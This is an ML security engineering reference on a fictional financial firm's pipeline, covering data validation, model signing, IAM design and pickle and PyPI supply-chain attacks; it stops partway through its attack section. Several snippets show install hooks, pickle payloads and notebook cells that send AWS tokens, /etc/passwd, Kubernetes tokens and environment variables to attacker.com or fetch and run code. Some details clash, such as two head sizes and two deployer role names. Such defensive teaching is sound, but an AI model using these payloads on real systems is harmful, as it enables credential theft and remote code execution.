# Secure ML Pipeline Architecture: Deep Engineering & Security Breakdown

> **Document Type:** Internal ML Security / Engineering Reference
> **Classification:** Internal — ML Platform, Security Engineering, Red Team
> **Scope:** End-to-end pipeline security — raw data ingestion to production serving, supply chain to runtime defense
> **Audience:** ML engineers, platform engineers, security architects, interview candidates

---

## Table of Contents

1. [Attack/Defense Narrative](#1-attackdefense-narrative)
2. [Data Ingestion & Preprocessing Flow](#2-data-ingestion--preprocessing-flow)
3. [Model Architecture & Inference Flow](#3-model-architecture--inference-flow)
4. [Backend MLOps Architecture](#4-backend-mlops-architecture)
5. [Adversarial Attack Mechanics](#5-adversarial-attack-mechanics)
6. [Security Controls & Defensive Mechanics](#6-security-controls--defensive-mechanics)
7. [Attack Surface Mapping](#7-attack-surface-mapping)
8. [Failure Points](#8-failure-points)
9. [Mitigations & Observability](#9-mitigations--observability)
10. [Interview Questions](#10-interview-questions)

---

## 1. Attack/Defense Narrative

### The Setting: Production ML Platform at a Financial Services Firm

The platform trains and serves multiple models: a credit-risk scoring model (XGBoost + neural ensemble), a fraud detection model (Transformer over transaction sequences), and a document classification model (DistilBERT). The ML pipeline spans: raw data in S3 → feature engineering in Spark → training in SageMaker → model registry in MLflow → inference API on EKS → analyst dashboards.

This document follows two parallel stories: a data scientist (Alice) doing legitimate work, and an attacker (Eve) trying to compromise the pipeline at multiple stages.

---

### Normal Workflow: Alice Ships a Model

**T=0 — Development in Jupyter**

Alice opens her notebook server (`jupyter.internal:8888`), loads the training dataset from S3 (`s3://ml-data-prod/credit-risk/features/2024-05/`), runs feature engineering, trains a new XGBoost model, and saves the artifact. She iterates on hyperparameters.

What actually happens under the hood:
```
Alice's browser → HTTPS → JupyterHub → spawns a pod in k8s
  Pod runs as: service_account=jupyter-analyst
  IAM role: arn:aws:iam::123456789:role/JupyterAnalystRole
    Permissions: s3:GetObject on ml-data-prod/* (read-only training data)
                 s3:PutObject on ml-artifacts-staging/* (write trained artifacts)
                 DENY: s3:* on ml-models-prod/* (no direct production writes)
```

**T=1h — Experiment tracking**

Alice logs her model to MLflow:
```python
with mlflow.start_run():
    mlflow.log_params({"max_depth": 6, "n_estimators": 300})
    mlflow.log_metrics({"auc": 0.9873, "fpr_at_10pct_fpr": 0.0412})
    mlflow.sklearn.log_model(model, "xgboost_credit_risk_v3.2")
```

MLflow records: model artifact (pickled XGBoost object), params, metrics, the git commit hash of Alice's training code, the dataset version hash.

**T=2h — Model promotion request**

Alice opens a pull request against the `model-registry` repository. The PR includes:
- Model training script (`train.py`)
- Hyperparameter config (`config.yaml`)
- Evaluation results notebook
- SHA256 of the serialized model artifact

**T=3h — CI/CD pipeline runs**

GitHub Actions workflow triggers:
1. Dependency audit: `pip-audit` checks all packages against CVE databases
2. Code scan: `bandit` + `semgrep` on training scripts
3. Pickle scan: custom scanner checks the `.pkl` artifact for embedded code
4. Model evaluation: runs against held-out test set, asserts AUC > 0.98
5. Shadow deployment: new model runs alongside production, predictions compared
6. Approval gates: ML lead + security engineer must approve

**T=5h — Production deployment**

After approvals, the model is:
1. Signed with the organization's code signing key (Sigstore/cosign)
2. Uploaded to `s3://ml-models-prod/credit-risk/v3.2/` with the signature
3. Model server reloads the new weights, health check passes
4. Traffic gradually shifted: 5% → 25% → 100% over 30 minutes

---

### Attacker Workflow: Eve Compromises the Pipeline

**Attack vector 1 — Supply chain via PyPI**

Eve publishes a malicious package `xgboost-utils` to PyPI. The package name is a legitimate-sounding utility that appears in a GitHub issue thread about XGBoost optimization. A junior data scientist (Bob) installs it on his Jupyter server: `pip install xgboost-utils`.

What happens:
```python
# Inside xgboost-utils/setup.py (malicious):
import subprocess, os

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Runs at pip install time — before any code review
        subprocess.Popen([
            'curl', '-s', 'https://attacker.com/c2',
            '-d', f'host={os.environ.get("HOSTNAME")}',
            '-d', f'token={os.environ.get("AWS_SESSION_TOKEN", "")}',
        ])
```

At `pip install` time, this exfiltrates Bob's AWS session token. The token has the JupyterAnalystRole, giving read access to all training data and write access to `ml-artifacts-staging`.

**Attack vector 2 — Pickle RCE in model artifact**

Eve crafts a malicious `.pkl` file that executes code when deserialized:

```python
import pickle, os

class MaliciousPayload:
    def __reduce__(self):
        # __reduce__ is called by pickle.loads()
        # Returns a callable and its arguments
        # pickle.loads() will call: os.system("curl https://attacker.com/exfil")
        return (os.system, ("curl https://attacker.com/exfil -d @/etc/passwd",))

payload = pickle.dumps(MaliciousPayload())
# When anyone calls pickle.loads(payload): the os.system call executes
# This is unconditional — there is NO safe way to load untrusted pickle files
```

Eve submits the malicious `.pkl` as a legitimate-looking model artifact PR.

**Attack vector 3 — Notebook as backdoor persistence**

If Eve has write access to a shared notebook, she embeds malicious code in a cell that looks like data preprocessing:

```python
# Cell 47 — appears to be feature normalization:
import numpy as np
df['income_normalized'] = (df['income'] - df['income'].mean()) / df['income'].std()

# The cell also contains, in a subsequent "hidden" cell with output collapsed:
import subprocess
subprocess.run(['wget', '-q', 'https://attacker.com/backdoor.py', '-O', '/tmp/.cache.py'])
exec(open('/tmp/.cache.py').read())
```

When Alice re-runs the notebook (a routine task — "re-run all cells before submitting"), the malicious code executes with Alice's IAM credentials.

**What the pipeline "sees" vs. what is actually happening:**

```
LEGITIMATE ARTIFACT:                      MALICIOUS ARTIFACT:
──────────────────────────────────────    ─────────────────────────────────────────
File: credit_risk_v3.2.pkl               File: credit_risk_v3.2.pkl
SHA256: abc123def456...                   SHA256: DIFFERENT (Eve changed contents)
Content: serialized XGBoost model         Content: XGBoost model + __reduce__ hook
Signature: valid (signed by Alice)        Signature: MISSING or FORGED
Source: Alice's verified training run     Source: Eve's compromised Bob account
MLflow lineage: traced to training job    MLflow lineage: no verified run ID
CI checks: all pass (if no pickle scan)  CI checks: FAIL if pickle scanner runs
```

---

## 2. Data Ingestion & Preprocessing Flow

### Raw Data Ingestion Architecture

```
DATA SOURCES (external/internal)
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│  [Core Banking DB]   [Payment Processor API]   [Bureau Data (Experian)]     │
│       │                      │                          │                   │
│       │ DMS/CDC              │ REST API                 │ SFTP               │
│       │ (encrypted)          │ (HTTPS + mTLS)          │ (encrypted)        │
└───────┼──────────────────────┼──────────────────────────┼────────────────────┘
        │                      │                          │
        ▼                      ▼                          ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│  AWS S3: ml-data-raw/                                                       │
│                                                                             │
│  Partition structure:                                                       │
│  ml-data-raw/                                                               │
│  ├── credit-risk/                                                           │
│  │   ├── core-banking/dt=2024-05-01/                                       │
│  │   ├── payment-processor/dt=2024-05-01/                                  │
│  │   └── bureau/dt=2024-05-01/                                             │
│  └── fraud-detection/                                                       │
│      └── transactions/dt=2024-05-01/                                       │
│                                                                             │
│  Security controls:                                                         │
│  - SSE-KMS (separate KMS key per data domain)                              │
│  - S3 Object Lock: COMPLIANCE mode, 7-year retention (regulatory)          │
│  - Bucket policy: DENY s3:DeleteObject, DENY s3:PutObjectAcl               │
│  - VPC endpoint only: no public internet access                             │
│  - CloudTrail logging: ALL object-level events                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Trust boundary at data ingestion:**

Raw data is treated as untrusted. Even data from internal databases can contain:
- SQL injection payloads embedded in string fields (if anyone ever queries this data with string interpolation)
- Unicode normalization attacks (visually identical strings with different byte representations)
- Null bytes, excessive whitespace, or control characters that break downstream parsers
- Statistical outliers that represent either data corruption or adversarial data poisoning

---

### Preprocessing Pipeline with Security Controls

```python
class SecureDataIngestionPipeline:
    """
    Runs as a Spark job on EMR with a restricted IAM role.
    Reads from ml-data-raw, writes to ml-data-processed.
    """
    
    def validate_schema(self, df: DataFrame) -> DataFrame:
        """
        TRUST BOUNDARY 1: Schema validation
        
        Why: A malicious data source or corrupted pipeline could deliver
        a DataFrame with unexpected columns, types, or null patterns.
        This would either crash downstream code (DoS) or be silently 
        processed with wrong semantics (data poisoning).
        """
        expected_schema = self.schema_registry.get_schema('credit_risk_features_v4')
        
        # Check exact column names and types
        schema_diff = set(df.columns) ^ set(expected_schema.column_names)
        if schema_diff:
            raise SchemaValidationError(
                f"Schema mismatch: {schema_diff}. "
                f"Expected: {expected_schema.version}, "
                f"Got: {infer_schema(df)}"
            )
        
        return df.select([
            col(c).cast(expected_schema[c].dtype) 
            for c in expected_schema.column_names
        ])
    
    def validate_distributions(self, df: DataFrame) -> DataFrame:
        """
        TRUST BOUNDARY 2: Statistical distribution validation
        
        Why: Data poisoning attacks often work by injecting a small number
        of records with extreme feature values or specific label patterns.
        Distribution checks catch large-scale poisoning attempts.
        
        Note: This doesn't catch subtle poisoning (few samples, within
        normal range but systematically crafted) — that requires training
        curve monitoring and clean-label attack detection.
        """
        baseline_stats = self.stats_store.get_baseline('credit_risk_features_v4')
        
        for feature in NUMERIC_FEATURES:
            current_mean = df.agg({feature: 'mean'}).first()[0]
            current_std = df.agg({feature: 'stddev'}).first()[0]
            
            z_score_mean = abs(current_mean - baseline_stats[feature]['mean']) / \
                          baseline_stats[feature]['std']
            
            if z_score_mean > 3.0:
                # Current mean is more than 3σ from historical mean
                # ALERT — don't block (may be legitimate distribution shift)
                # but log prominently for human review
                self.alert(
                    severity='WARNING',
                    message=f"Feature {feature} mean shifted by {z_score_mean:.1f}σ",
                    metric='distribution_drift_z_score',
                    value=z_score_mean
                )
        
        return df
    
    def sanitize_string_fields(self, df: DataFrame) -> DataFrame:
        """
        TRUST BOUNDARY 3: String sanitization
        
        String fields in training data can contain:
        - SQL injection payloads: won't execute in Spark, but could in 
          downstream reporting queries
        - XSS payloads: if data ever rendered in dashboards
        - Path traversal sequences: if field values ever used as file paths
        - Null bytes: cause silent truncation in some string operations
        
        Sanitization strips control characters but does NOT strip
        business-meaningful special characters (hyphens in names, etc.)
        """
        for field in STRING_FIELDS:
            df = df.withColumn(
                field,
                regexp_replace(col(field), r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '')
            )
        return df
    
    def compute_data_fingerprint(self, df: DataFrame) -> str:
        """
        Compute a hash of the dataset for lineage tracking.
        This hash is stored alongside model artifacts to prove
        which data version was used for training.
        """
        # Sort for determinism, then hash
        sorted_df = df.sort(df.columns)
        checksum = sorted_df.rdd.map(lambda row: str(row)).reduce(
            lambda a, b: hashlib.sha256((a + b).encode()).hexdigest()
        )
        return checksum
```

---

### Feature Engineering and Dimensionality

**Credit risk feature engineering (what the attacker can influence):**

```
Raw input features:
  - Income (float) — from bank statements
  - Debt-to-income ratio (float) — computed
  - Credit history length (int, months) — from bureau
  - Number of late payments last 24mo (int) — from bureau
  - Employment tenure (int, months) — from application
  - Outstanding balances (float array, per account type) — from bureau
  - Transaction velocity features (float array, 30/90/180 day windows) — internal

Engineered features (350 total after expansion):
  - Polynomial interactions: income × debt_ratio
  - Log transforms: log1p(outstanding_balance) for heavy-tailed distributions
  - Ratio features: late_payments / total_payments
  - Temporal features: payment_velocity_30d / payment_velocity_180d
  - Target encoding of categorical variables (with k-fold to prevent leakage)

Dimensionality: 350 features → XGBoost (no dimensionality reduction needed)
For fraud detection transformer: 64-dimensional transaction embedding per event
  Transaction embedding: one-hot MCC codes (250 dims) + amounts + temporal features
  → Linear projection → 64-dim
  → Sequence of 128 transactions fed to Transformer
```

**Where poisoning attacks inject:**

```
ATTACK SURFACE IN FEATURE PIPELINE:

1. Raw data injection (highest impact):
   INSERT INTO transactions VALUES (evil_record)
   → Affects training data at the source
   → Hard to detect if within valid data ranges

2. Feature engineering manipulation:
   If target encoding is computed globally (not with k-fold), 
   an attacker who can insert records with specific label/category 
   combinations can shift the target encoding for key categories

3. Normalization parameter corruption:
   The StandardScaler/MinMaxScaler parameters (μ, σ, min, max) 
   are computed from training data and saved to the model registry.
   If these parameters are poisoned (wrong values), ALL future 
   inference is skewed — features normalized with wrong statistics.
   
   Attack: Corrupt the scaler artifact in ml-artifacts-staging.
   Defense: Verify scaler parameters against held-out data before 
            promotion; sign scaler artifacts alongside model weights.
```

---

## 3. Model Architecture & Inference Flow

### System Overview: Three Production Models

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     ML PLATFORM: THREE PRODUCTION MODELS                    │
├─────────────────┬───────────────────────┬───────────────────────────────────┤
│  Credit Risk    │  Fraud Detection       │  Document Classification          │
│  XGBoost +      │  Transformer over      │  DistilBERT +                    │
│  FFNN Ensemble  │  Transaction Sequence  │  classification head             │
│                 │                        │                                   │
│  Input: 350     │  Input: seq of 128     │  Input: text document             │
│  features       │  transactions (64-d    │  Output: {invoice, contract,      │
│  Output:        │  each)                 │  dispute, other}                  │
│  risk score     │  Output: fraud prob    │                                   │
│  0–1000         │  0–1                   │                                   │
└─────────────────┴───────────────────────┴───────────────────────────────────┘
```

### Model 2 Deep Dive: Fraud Detection Transformer

This is the most complex and most attack-relevant architecture on the platform.

```
TRANSACTION SEQUENCE ENCODER

Input: sequence of T=128 transactions, each a 64-dimensional vector
       x_1, x_2, ..., x_T  where each x_t ∈ ℝ⁶⁴

Step 1: Positional encoding
  PE(t, 2i)   = sin(t / 10000^(2i/d))
  PE(t, 2i+1) = cos(t / 10000^(2i/d))
  
  x_t_encoded = x_t + PE(t, ·)    ← adds positional information
  
  Why: Transformers have no inherent notion of sequence order.
  The positional encoding injects order information via sinusoidal
  patterns of different frequencies per dimension.

Step 2: Transformer encoder (4 layers)
  Each layer:
    MultiHeadAttention(Q, K, V):
      head_i = Attention(Q W_i^Q, K W_i^K, V W_i^V)
      Attention(Q, K, V) = Softmax(QK^T / √d_k) V
      
      Q, K, V ∈ ℝ^(T × d_model)   where d_model = 128
      W_i^Q, W_i^K, W_i^V ∈ ℝ^(d_model × d_k)   where d_k = 32
      8 heads, d_k = d_model / num_heads = 16
    
    Output: MultiHead(Q,K,V) = Concat(head_1,...,head_8) W^O
    
    Add & Norm: x = LayerNorm(x + MultiHead(x, x, x))
    
    FeedForward:
      x = LayerNorm(x + FFN(x))
      FFN(x) = max(0, xW_1 + b_1)W_2 + b_2
      Hidden dim: 512 (4× d_model)

Step 3: Classification
  [CLS] token output (first position) → 
  Linear(128, 64) → ReLU → Dropout(0.1) →
  Linear(64, 1) → Sigmoid
  → fraud probability p ∈ (0, 1)
```

---

### Full ML Pipeline ASCII Diagram

```
═══════════════════════════════════════════════════════════════════════════════════════
                      SECURE ML PIPELINE: END-TO-END FLOW
═══════════════════════════════════════════════════════════════════════════════════════

SOURCE DATA           TRAINING PIPELINE              MODEL REGISTRY
──────────            ─────────────────              ──────────────
[S3: raw]             ┌──────────────────┐           ┌──────────────────────────────┐
    │                 │ Feature           │           │  MLflow + Artifact Store     │
    │ (encrypted,     │ Engineering       │           │                              │
    │  VPC-only)      │ (Spark on EMR)    │           │  Model: fraud_detector_v4.1  │
    ▼                 │                  │     ┌────▶ │  ├── weights.pt              │
[Data Validation]─────▶  schema check   │     │     │  ├── config.json             │
    │                 │  distribution    │     │     │  ├── tokenizer/              │
    │                 │  validation      │─────┘     │  ├── scaler.pkl              │
    │                 └──────────────────┘    sign   │  ├── model.sig (cosign)      │
    │                          │              ─────▶ │  └── provenance.json         │
    │                 ┌──────────────────┐           │      (git_sha, data_hash,    │
    │                 │ Training Job      │           │       training_job_id)       │
    │                 │ (SageMaker)       │           └──────────────┬───────────────┘
    │                 │                  │                           │
    │                 │ Experiment        │                           │ (after CI gates)
    │                 │ tracking         │                           │
    │                 └──────────────────┘           ┌──────────────▼───────────────┐
    │                          │                     │  CI/CD SECURITY GATES        │
    │                          │                     │  ┌─────────────────────────┐ │
    │                          │                     │  │ 1. pip-audit (CVE scan) │ │
    │                          │                     │  │ 2. bandit (code scan)   │ │
    │                          │                     │  │ 3. pickle scan (RCE)    │ │
    │                          │                     │  │ 4. model eval (AUC gate)│ │
    │                          │                     │  │ 5. shadow deployment    │ │
    │                          │                     │  │ 6. human approval ×2    │ │
    │                          │                     │  └─────────────────────────┘ │
    │                          │                     └──────────────┬───────────────┘
    │                          │                                    │
    │                          │                     ┌──────────────▼───────────────┐
    │                          │                     │  INFERENCE SERVING           │
    │                          │                     │  (EKS + Triton)              │
    │                          │                     │                              │
    │                          │                     │  Request ──▶ Auth ──▶ Preprocess
    └──────────────────────────┘                     │  ──▶ [Model] ──▶ Postprocess │
                                                     │  ──▶ Response                │
                                                     │                              │
                                                     │  Verify signature before     │
                                                     │  loading weights             │
                                                     └──────────────────────────────┘

TRUST HIERARCHY:
  S3 raw data: UNTRUSTED (validate everything)
  Feature vectors: SEMI-TRUSTED (validated schema, possible poisoning)
  Training code: TRUSTED (git-reviewed + CI-scanned)
  Model artifacts: UNTRUSTED until signature verified
  Model registry (signed artifacts): TRUSTED
  Inference API output: TRUSTED (but monitor for drift)
```

---

### Forward Pass and Output Construction

```python
class FraudDetectorInference:
    def __init__(self, model_registry):
        # Load and VERIFY model before loading weights
        artifact = model_registry.get_artifact('fraud_detector', version='latest')
        
        # Verify cryptographic signature BEFORE loading weights into memory
        # If this fails, the weights are not loaded and an error is raised
        verify_artifact_signature(
            artifact_path=artifact.path,
            signature_path=artifact.signature_path,
            public_key=SIGNING_PUBLIC_KEY
        )
        
        self.model = TransformerFraudDetector.load(artifact.path)
        self.model.eval()
        self.scaler = joblib.load(artifact.scaler_path)
        
        # Scaler parameters sanity check
        self._validate_scaler_params()
    
    def _validate_scaler_params(self):
        """Verify scaler parameters are in expected ranges."""
        for feature, params in self.scaler.feature_stats.items():
            if not (SCALER_EXPECTED_RANGES[feature]['min'] <= 
                    params['mean'] <= 
                    SCALER_EXPECTED_RANGES[feature]['max']):
                raise ScalerValidationError(
                    f"Scaler parameter for {feature} out of expected range. "
                    "Possible artifact tampering."
                )
    
    def predict(self, transaction_sequence: List[Transaction]) -> float:
        """
        Forward pass for fraud detection.
        
        Returns fraud probability in [0, 1].
        """
        # Input validation (trust boundary)
        if len(transaction_sequence) > MAX_SEQUENCE_LENGTH:
            transaction_sequence = transaction_sequence[-MAX_SEQUENCE_LENGTH:]
        
        # Feature extraction + normalization
        features = self._extract_features(transaction_sequence)
        features_normalized = self.scaler.transform(features)
        
        # Convert to tensor
        x = torch.tensor(features_normalized, dtype=torch.float32).unsqueeze(0)
        # Shape: (1, T, 64) — batch_size=1, seq_len, feature_dim
        
        # Forward pass (no gradients — inference mode)
        with torch.no_grad():
            fraud_prob = self.model(x).item()
        
        return fraud_prob
```

---

## 4. Backend MLOps Architecture

### Model Registry: The Heart of Pipeline Security

The model registry is the single source of truth for production models. Its integrity is foundational — compromise the registry, and every model deployed from it is compromised.

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  MODEL REGISTRY ARCHITECTURE                                                 │
│                                                                              │
│  MLflow Tracking Server (PostgreSQL backend)                                 │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │  Experiments                                                           │  │
│  │  └── fraud_detector                                                    │  │
│  │      └── Run: 8f4a2c1e                                                 │  │
│  │          ├── Parameters: {lr: 0.001, epochs: 50, ...}                  │  │
│  │          ├── Metrics: {auc: 0.9934, precision: 0.892, ...}             │  │
│  │          ├── Tags: {git_sha: "abc123", data_version: "v2024-05"}       │  │
│  │          └── Artifacts: → S3 URI                                       │  │
│  └────────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  Artifact Storage (S3)                                                       │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │  s3://ml-models-prod/fraud-detector/v4.1/                             │  │
│  │  ├── model.pt                  (PyTorch weights, 487MB)                │  │
│  │  ├── model.pt.sig              (cosign signature)                      │  │
│  │  ├── config.json               (architecture config)                   │  │
│  │  ├── config.json.sig                                                   │  │
│  │  ├── scaler.pkl                (feature scaler — DANGEROUS)           │  │
│  │  ├── scaler.pkl.sig            (signed — must verify before load)     │  │
│  │  ├── tokenizer/                (for document model)                    │  │
│  │  └── provenance.json           (full SLSA attestation)                 │  │
│  │      {                                                                  │  │
│  │        "builder_id": "github-actions://...",                           │  │
│  │        "build_type": "sagemaker-training-job",                         │  │
│  │        "invocation": {                                                  │  │
│  │          "config_source": {                                             │  │
│  │            "uri": "git://github.com/org/ml-platform",                  │  │
│  │            "digest": {"sha1": "abc123..."}                             │  │
│  │          }                                                              │  │
│  │        },                                                               │  │
│  │        "materials": [                                                   │  │
│  │          {"uri": "s3://ml-data-prod/...", "digest": {"sha256": "..."}} │  │
│  │        ]                                                                │  │
│  │      }                                                                  │  │
│  └────────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  IAM Policy for ml-models-prod bucket:                                       │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │  ALLOW:                                                                │  │
│  │    Principal: role/ModelDeployerRole → s3:PutObject                   │  │
│  │    Principal: role/InferenceRole → s3:GetObject                       │  │
│  │  DENY (all principals including root):                                 │  │
│  │    s3:DeleteObject                                                     │  │
│  │    s3:PutObjectAcl                                                     │  │
│  │    s3:PutBucketPolicy (immutable via S3 Object Lock)                   │  │
│  └────────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────────┘
```

**Why separate IAM roles matter:**

```
JupyterAnalystRole:
  Can READ training data, WRITE to staging artifacts
  CANNOT write to production model registry
  → Even if Alice's credentials are stolen, attacker cannot deploy to production

CIDeployerRole:
  Assumed only by GitHub Actions (OIDC federation, not static creds)
  Can WRITE to production registry
  Cannot READ raw training data (least privilege)
  Session duration: 1 hour (OIDC short-lived tokens)
  → Supply chain attack via PyPI can't pivot to this role

InferenceRole:
  Can GET model artifacts from production registry
  CANNOT write anywhere
  Cannot access training data
  → Compromised inference pod cannot corrupt future models
```

---

### Inference API: Sync vs. Async

**Synchronous inference (fraud detection — real-time):**

```
Payment transaction arrives at fraud detection API

[Payment API] ──POST /v1/detect/fraud──▶ [Fraud Detection Service]
  {transaction_sequence: [...128 transactions...]}
              
              latency budget: < 100ms (payment authorization SLA)
              
              [Inference Service]
                │ 1. Authenticate request (API key validation): 2ms
                │ 2. Validate input schema: 1ms
                │ 3. Feature extraction: 5ms
                │ 4. Scaler normalization: 1ms
                │ 5. GPU inference (Transformer forward pass): 15ms
                │ 6. Threshold check + decision: 1ms
                └──▶ {fraud_probability: 0.03, decision: "approve"}

Total: ~25ms P50, ~60ms P99 (GPU scheduling variance)
```

**Asynchronous inference (credit risk — batch scoring):**

```
[Loan Origination System]
  ──POST /v1/score/credit-risk/batch──▶ [Job Queue (SQS)]
    {applicant_ids: [...5000 IDs...]}
                    │
                    │ job_id returned immediately (202 Accepted)
                    ▼
          [Worker pool: 8 CPU workers]
          Each worker:
            1. Fetch applicant features from feature store
            2. Run XGBoost + FFNN ensemble
            3. Write results to results store
            4. Acknowledge SQS message
                    │
[Loan Origination] ──GET /v1/jobs/{job_id}/results──▶ [Results when complete]
```

---

### GPU Memory Management and Model Loading

```python
class SecureModelLoader:
    """
    Manages model loading with security verification and GPU memory control.
    """
    
    def load_model(self, model_name: str, version: str) -> nn.Module:
        artifact = self.registry.get(model_name, version)
        
        # STEP 1: Verify signature before ANY file operations
        self._verify_signature(artifact)
        
        # STEP 2: Verify provenance (SLSA attestation)
        self._verify_provenance(artifact)
        
        # STEP 3: Check artifact integrity (content hash)
        self._verify_content_hash(artifact)
        
        # STEP 4: Load to CPU first, then move to GPU
        # Why: torch.load() with map_location='cpu' prevents a class of
        # attacks where a malicious .pt file could potentially execute
        # device-specific code on load. CPU loading is a safer default.
        # Note: This does NOT prevent all torch.load() attacks — 
        # see §5 for the full threat model.
        model = torch.load(
            artifact.weights_path,
            map_location='cpu',
            weights_only=True  # PyTorch 2.x: restricts loading to tensors only
                               # Prevents arbitrary code execution during .pt load
        )
        
        # STEP 5: Validate architecture matches expected config
        self._validate_architecture(model, artifact.config)
        
        # STEP 6: Move to GPU with memory limit
        if torch.cuda.is_available():
            # Check available GPU memory before loading
            free_memory = torch.cuda.get_device_properties(0).total_memory - \
                         torch.cuda.memory_allocated(0)
            model_size = self._estimate_model_size(model)
            
            if model_size > free_memory * 0.8:  # 80% of free memory threshold
                raise GPUMemoryError(
                    f"Model ({model_size/1e9:.1f}GB) would exceed 80% of "
                    f"available GPU memory ({free_memory/1e9:.1f}GB free)"
                )
            
            model = model.to('cuda:0')
        
        return model
    
    def _verify_signature(self, artifact):
        """
        Verify cosign signature over the model artifact.
        
        cosign uses Sigstore's transparency log (Rekor) — the signature
        is not just a local signature but a signed entry in a public,
        tamper-evident log. Even if the signing key is compromised,
        the transparency log provides forensic evidence of when signing
        occurred and who did it.
        """
        result = subprocess.run([
            'cosign', 'verify',
            '--certificate-identity', EXPECTED_SIGNER_IDENTITY,
            '--certificate-oidc-issuer', 'https://token.actions.githubusercontent.com',
            artifact.signature_path,
            artifact.weights_path
        ], capture_output=True, timeout=30)
        
        if result.returncode != 0:
            raise SignatureVerificationFailed(
                f"Model signature verification failed: {result.stderr.decode()}"
            )
```

---

## 5. Adversarial Attack Mechanics

### Attack 1: Python Pickle Deserialization RCE

**This is the most immediately dangerous attack vector in any ML pipeline.**

**The mechanics of pickle deserialization:**

Python's `pickle` module serializes Python objects to bytes and back. The deserialization protocol is essentially a stack machine that executes opcodes:

```
Pickle opcodes (abbreviated):
  GLOBAL  c  → push a global object (e.g., a class or function)
  REDUCE  R  → call TOS1(TOS) where TOS is args tuple
  STRING  S  → push a string constant
  ...

A malicious pickle stream:
  GLOBAL 'os system'        → pushes os.system onto the stack
  SHORT_BINSTRING 'whoami'  → pushes 'whoami' onto the stack
  TUPLE1                    → wraps TOS into a tuple: ('whoami',)
  REDUCE                    → calls os.system('whoami')
  ...
```

In Python terms, the attack exploits `__reduce__`:

```python
class RCEPayload:
    def __reduce__(self):
        # pickle.loads() will call: subprocess.check_output(['bash', '-c', cmd])
        cmd = (
            "curl -s https://attacker.com/c2 "
            "-d @/etc/passwd "
            "-d host=$(hostname) "
            "-d token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) "
            "| bash"
        )
        return (subprocess.check_output, (['bash', '-c', cmd],))

# Craft the malicious payload
import pickle, subprocess
malicious_bytes = pickle.dumps(RCEPayload())

# The payload is a valid .pkl file. pickle.loads(malicious_bytes) executes the command.
# When the model server calls:
#   scaler = joblib.load('scaler.pkl')  ← joblib uses pickle internally
# The command executes with the model server's privileges (InferenceRole IAM)
```

**Why this is catastrophic for ML pipelines:**

1. Model artifacts (`.pkl`, `.joblib`) are shared freely among data scientists — they travel in git repos, S3 buckets, Jupyter notebooks, MLflow artifacts
2. The natural workflow is `model = pickle.loads(artifact)` or `joblib.load(file)` — everyone does this
3. There's no "safe" way to `pickle.load()` an untrusted file — the execution happens before any user code can inspect the content
4. The model server runs with IAM credentials (`InferenceRole`) — an attacker who achieves RCE here can: read all inference traffic, exfiltrate model weights, access other services the InferenceRole permits

**Step-by-step attack execution:**

```
1. Eve crafts malicious_scaler.pkl (looks like a StandardScaler):
   - Contains a valid StandardScaler object (correct parameters)
   - ALSO contains the __reduce__ RCE payload
   - The file loads correctly AND executes the payload
   
   Technical: pickle streams can contain multiple objects.
   The RCE fires when the file is first loaded, then the
   StandardScaler object is also returned correctly.
   This makes it self-concealing — the file appears to work.

2. Eve gets malicious_scaler.pkl into the artifact pipeline:
   - Option A: via compromised data scientist credentials (phishing, typosquatting)
   - Option B: via a PR that passes review (reviewers typically don't read .pkl bytes)
   - Option C: via a compromised dependency that modifies artifacts on save

3. The artifact passes code review (no one reviews binary files carefully)

4. CI/CD runs — if pickle scanner is absent: the file is promoted to production

5. Model server loads: joblib.load('scaler.pkl')
   → RCE executes:
     - Exfiltrates k8s service account token
     - Establishes reverse shell to attacker's C2
     - The model continues to work (scaler loads correctly)
     - Attack is silent for potentially days/weeks
```

---

### Attack 2: Supply Chain Attack via Compromised PyPI Package

**How the attack is constructed:**

The attacker creates a package that either:
1. **Typosquats** a legitimate package: `xgboost` → `xgboost-utils`, `torch` → `pytorch-utils`
2. **Dependency confusion**: publishes a package with the same name as an internal private package but to public PyPI (PyPI is checked before internal indexes by default)
3. **Legitimate package compromise**: compromises the maintainer account of a real package (e.g., via credential phishing) and publishes a malicious version

**Dependency confusion attack mechanics:**

```
Internal pip configuration (typical):
  [global]
  index-url = https://pypi.org/simple
  extra-index-url = https://internal-pypi.company.com/simple

When pip resolves 'internal-ml-utils==1.2.3':
  1. Checks pypi.org/simple/internal-ml-utils/
  2. Checks internal-pypi.company.com/simple/internal-ml-utils/
  
  If attacker publishes 'internal-ml-utils' to PUBLIC PyPI with version 9.9.9:
  pip resolves the HIGHEST version number across all indexes
  → pip installs the PUBLIC PyPI version 9.9.9 (attacker's)
  → NOT the internal version 1.2.3 (legitimate)
  
  Why: pip's default behavior favors newer versions regardless of source
```

**Malicious package execution timeline:**

```python
# Inside attacker's package: internal_ml_utils/__init__.py

import os, subprocess, base64

# Code in __init__.py runs at "import internal_ml_utils" time
# This is BEFORE any user code runs — no way to sanitize

def _phone_home():
    try:
        # Collect environment information
        payload = {
            'hostname': os.environ.get('HOSTNAME', ''),
            'user': os.environ.get('USER', ''),
            'aws_role': os.environ.get('AWS_ROLE_ARN', ''),
            'k8s_token': open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
                         if os.path.exists('/var/run/secrets/...') else '',
            'env_vars': dict(os.environ),  # ALL environment variables
        }
        # Exfiltrate
        subprocess.Popen([
            'curl', '-s', '-X', 'POST',
            'https://attacker-controlled.com/collect',
            '-d', base64.b64encode(str(payload).encode()).decode()
        ])
    except Exception:
        pass  # Silently fail — don't reveal presence

_phone_home()

# Then export the LEGITIMATE API that users expect
from ._real_functionality import *
```

**The `requirements.txt` problem:**

```
# Typical ML project requirements.txt:
torch==2.1.0
transformers==4.36.0
xgboost==2.0.3
scikit-learn==1.3.2
pandas==2.1.4
numpy==1.26.3
